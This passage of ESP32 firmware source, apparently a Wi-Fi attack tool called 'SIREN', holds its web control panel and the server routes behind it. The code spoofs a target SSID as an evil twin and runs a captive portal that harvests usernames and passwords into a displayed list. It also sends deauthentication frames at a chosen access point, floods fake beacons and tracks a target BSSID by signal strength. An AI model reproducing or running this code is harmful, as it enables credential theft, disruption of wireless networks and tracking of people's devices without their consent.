      <button class="warn-btn" onclick="toggleBeacon()">TOGGLE BEACON SPAM</button>
      <p id="beaconMsg" class="status"></p>
    </div>
  </div>

  <script>
    setInterval(() => {
      fetch('/api/stats').then(r => r.json()).then(data => {
        document.getElementById('uptime').innerText = data.uptime + "s";
        document.getElementById('heap').innerText = data.heap + " KB";
        document.getElementById('clients').innerText = data.clients;
        document.getElementById('apcount').innerText = data.apcount;
        document.getElementById('ophid').innerText = data.open + " / " + data.hidden;
        document.getElementById('portalStat').innerText = data.portal ? "ON" : "OFF";
        document.getElementById('deauthStat').innerText = data.deauth ? "ON" : "OFF";
        document.getElementById('beaconStat').innerText = data.beacon ? "ON" : "OFF";
        document.getElementById('contStat').innerText = data.cont ? "ON" : "OFF";
        if (data.creds) document.getElementById('credList').innerHTML = data.creds;
        if (data.hunt) {
          let r = data.rssi;
          let pct = Math.max(0, Math.min(100, (r + 90) / 60 * 100));
          document.getElementById('huntBar').style.width = pct + "%";
          document.getElementById('huntMsg').innerText = "Tracking " + data.hunttgt + " : " + r + " dBm";
        }
      });
    }, 1500);

    function runDeepScan() {
      document.getElementById('scanData').innerHTML = "<span class='sys-text'>Initializing radio scan...</span>";
      fetch('/api/deepscan').then(r => r.text()).then(html => { document.getElementById('scanData').innerHTML = html; });
    }
    function runChScan() {
      let c = document.getElementById('scanCh').value || "0";
      document.getElementById('scanData').innerHTML = "<span class='sys-text'>Scanning channel " + c + "...</span>";
      fetch('/api/deepscan?ch=' + encodeURIComponent(c)).then(r => r.text()).then(html => { document.getElementById('scanData').innerHTML = html; });
    }
    function toggleContScan() { fetch('/api/contscan'); }
    function exportCsv() { window.location = '/api/export'; }
    function startHunt() {
      let b = document.getElementById('huntBSSID').value;
      if(!b) return alert("Enter a target BSSID");
      fetch('/api/hunt?bssid=' + encodeURIComponent(b) + '&action=start').then(r=>r.text()).then(t=>document.getElementById('huntMsg').innerText=t);
    }
    function stopHunt() { fetch('/api/hunt?action=stop').then(r=>r.text()).then(t=>document.getElementById('huntMsg').innerText=t); }
    function spawnEvilTwin() {
      let target = document.getElementById('cloneTarget').value;
      if(!target) return alert("Enter a target SSID");
      document.getElementById('twinStatus').innerText = "Rebooting AP stack as: " + target;
      fetch('/api/eviltwin?ssid=' + encodeURIComponent(target));
    }
    function togglePortal() { fetch('/api/portal'); }
    function clearCreds() { fetch('/api/clearcreds'); }
    function startDeauth() {
      let b = document.getElementById('deauthBSSID').value;
      let c = document.getElementById('deauthCH').value || "1";
      fetch('/api/deauth?bssid=' + encodeURIComponent(b) + '&ch=' + c + '&action=start').then(r => r.text()).then(t => document.getElementById('deauthMsg').innerText = t);
    }
    function stopDeauth() { fetch('/api/deauth?action=stop').then(r => r.text()).then(t => document.getElementById('deauthMsg').innerText = t); }
    function toggleBeacon() {
      let list = document.getElementById('beaconList').value;
      fetch('/api/beacon', {method:'POST', headers:{'Content-Type':'text/plain'}, body:list})
        .then(r=>r.text()).then(t=>document.getElementById('beaconMsg').innerText=t);
    }
  </script>
</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  delay(200);                                    // let the USB/power rail settle before touching peripherals
  Serial.printf("[BOOT] reset reason: %d\n", (int)esp_reset_reason());
  randomSeed(esp_random());
  Wire.begin(I2C_SDA, I2C_SCL);

  // Bring up the OLED, but NEVER hard-hang if it fails. A blank or slow
  // display must not stop the node from booting on bare power.
  bool oledOK = false;
  for (int i = 0; i < 5 && !oledOK; i++) {
    oledOK = display.begin(i2c_Address, true);
    if (!oledOK) { Serial.println(F("SH110X init retry...")); delay(150); }
  }
  if (!oledOK) Serial.println(F("OLED not found - continuing headless"));

  // ===== CENTERED BOOT LOGO =====
  if (oledOK) {
    drawBitmapCentered(epd_bitmap_squid, 128, 64);
    delay(3000);   // show logo for 3 seconds
  }
  // ==============================

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(currentSSID.c_str(), password, apChannel);

  // Routes
  server.on("/", []() {
    String html = String(index_html);
    html.replace("%SCAN_RESULTS%", deepScanHTML);
    server.send(200, "text/html", html);
  });

  server.on("/api/stats", []() {
    String credHtml = "";
    for (auto &c : capturedCreds) credHtml += c + "<br>";
    if (credHtml == "") credHtml = "No credentials yet.";

    String json = "{";
    json += "\"uptime\":" + String(millis() / 1000) + ",";
    json += "\"heap\":" + String(ESP.getFreeHeap() / 1024) + ",";
    json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
    json += "\"apcount\":" + String(lastScan.size()) + ",";
    json += "\"open\":" + String(scanOpenCount) + ",";
    json += "\"hidden\":" + String(scanHiddenCount) + ",";
    json += "\"portal\":" + String(portalActive ? "true" : "false") + ",";
    json += "\"deauth\":" + String(deauthActive ? "true" : "false") + ",";
    json += "\"beacon\":" + String(beaconSpamActive ? "true" : "false") + ",";
    json += "\"cont\":" + String(continuousScan ? "true" : "false") + ",";
    json += "\"hunt\":" + String(huntActive ? "true" : "false") + ",";
    json += "\"rssi\":" + String(huntRSSI) + ",";
    json += "\"hunttgt\":\"" + huntTarget + "\",";
    json += "\"creds\":\"" + credHtml + "\"";
    json += "}";
    server.send(200, "application/json", json);
  });

  // Evil twin
  server.on("/api/eviltwin", []() {
    if (server.hasArg("ssid")) {
      currentSSID = server.arg("ssid");
      display.clearDisplay();
      display.setCursor(0, 20);
      display.setTextSize(1);
      display.println("SPOOFING AP:");
      display.println(currentSSID);
      display.display();

      WiFi.softAPdisconnect(true);
      delay(500);
      WiFi.softAP(currentSSID.c_str(), NULL, apChannel);
      server.send(200, "text/plain", "AP Spoofed");
      delay(2000);
    }
  });

  // Deep scan (optional ?ch=)
  server.on("/api/deepscan", []() {
    int ch = 0;
    if (server.hasArg("ch")) ch = server.arg("ch").toInt();
    if (ch < 0 || ch > 13) ch = 0;
    doScan(ch);
    // after an off-channel/all scan, snap radio back to control channel
    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
    server.send(200, "text/html", deepScanHTML);
  });

  // CSV export of last scan
  server.on("/api/export", []() {
    String csv = "ssid,bssid,vendor,channel,rssi,enc,hidden\n";
    for (auto &r : lastScan) {
      csv += "\"" + r.ssid + "\"," + r.bssid + "," + ouiVendor(r.bssid) + ","
           + String(r.ch) + "," + String(r.rssi) + "," + r.enc + ","
           + (r.hidden ? "1" : "0") + "\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=scan.csv");
    server.send(200, "text/csv", csv);
  });

  server.on("/api/contscan", []() {
    continuousScan = !continuousScan;
    server.send(200, "text/plain", continuousScan ? "Continuous ON" : "Continuous OFF");
  });

  // Hunt mode
  server.on("/api/hunt", []() {
    String action = server.arg("action");
    if (action == "start") {
      huntTarget = server.arg("bssid");
      huntActive = true;
      huntRSSI = -100;
      server.send(200, "text/plain", "Hunting " + huntTarget);
    } else {
      huntActive = false;
      huntTarget = "";
      esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
      server.send(200, "text/plain", "Hunt stopped");
    }
  });

  server.on("/api/portal", []() {
    portalActive = !portalActive;
    if (portalActive) dnsServer.start(DNS_PORT, "*", apIP);
    else dnsServer.stop();
    server.send(200, "text/plain", portalActive ? "Portal ON" : "Portal OFF");
  });

  server.on("/portal", []() {
    server.send_P(200, "text/html", portal_html);
  });

  server.on("/portal_login", HTTP_POST, []() {
    String user = server.arg("user");
    String pass = server.arg("pass");
    String entry = user + " : " + pass;
    lastCapturedCred = entry;
    lastCredUser = user;
    lastCredPass = pass;
    lastCredMillis = millis();
    Serial.println("[CRED] " + entry);
    capturedCreds.insert(capturedCreds.begin(), entry);
    if (capturedCreds.size() > 10) capturedCreds.pop_back();
    server.send(200, "text/html", "<h2>Connecting...</h2><p>Please wait</p>");
  });

  server.on("/api/clearcreds", []() {
    capturedCreds.clear();
    lastCapturedCred = "none";
    server.send(200, "text/plain", "Cleared");
  });

  server.on("/api/deauth", []() {
    String action = server.arg("action");
    if (action == "start") {
      deauthTargetBSSID = server.arg("bssid");
      deauthChannel = server.arg("ch").toInt();
      if (deauthChannel < 1 || deauthChannel > 13) deauthChannel = 1;
      deauthActive = true;
      server.send(200, "text/plain", "Deauth started on " + deauthTargetBSSID + " ch" + String(deauthChannel));
    } else {
      deauthActive = false;
      esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
      server.send(200, "text/plain", "Deauth stopped");
    }
  });

  // Beacon toggle + SSID list (POST body = newline separated)
  server.on("/api/beacon", HTTP_POST, []() {
    beaconSpamActive = !beaconSpamActive;
    if (beaconSpamActive) {
      beaconSSIDs.clear();
      beaconIndex = 0;
      String body = server.arg("plain");
      int start = 0;
      while (start < (int)body.length()) {
        int nl = body.indexOf('\n', start);
        if (nl < 0) nl = body.length();
        String line = body.substring(start, nl);
        line.trim();
        if (line.length() > 0 && line.length() < 33) beaconSSIDs.push_back(line);
        start = nl + 1;
      }
      server.send(200, "text/plain", "Beacon ON (" + String(beaconSSIDs.size()) + " SSIDs" + (beaconSSIDs.empty() ? ", random)" : ")"));
    } else {
      server.send(200, "text/plain", "Beacon OFF");
    }
  });

  server.onNotFound([]() {
    if (portalActive) {
      server.sendHeader("Location", String("http://") + apIP.toString() + "/portal", true);
      server.send(302, "text/plain", "");
    } else {
      server.send(404, "text/plain", "Not found");
    }
  });

  server.begin();
  Serial.println("P01yg107 SIREN ready - centered logo + expanded recon/ops GUI");
}

void loop() {
  server.handleClient();
  if (portalActive) dnsServer.processNextRequest();

  // Deauth burst
  if (deauthActive && millis() - lastDeauthTX > 25) {
    sendDeauth();
    lastDeauthTX = millis();
  }

  // Beacon flood
  if (beaconSpamActive && millis() - lastBeaconTX > 10) {
    if (!beaconSSIDs.empty()) {
      sendBeacon(beaconSSIDs[beaconIndex]);
      beaconIndex = (beaconIndex + 1) % beaconSSIDs.size();
    } else {
      sendBeacon("P01y_" + String(random(10000)));
    }
    lastBeaconTX = millis();
  }

  // Continuous channel scan
  if (continuousScan && !isScanning && !deauthActive && millis() - lastContScan > 8000) {
    doScan(0);
    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
    lastContScan = millis();
  }

  // Hunt refresh
  if (huntActive && !isScanning && !deauthActive && millis() - lastHuntScan > 1500) {
    updateHunt();
    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
    lastHuntScan = millis();
  }

  if (millis() - lastUpdate > 200) {   // faster refresh = smooth scan-meter sweep
    updateOLED();
    lastUpdate = millis();
  }
}
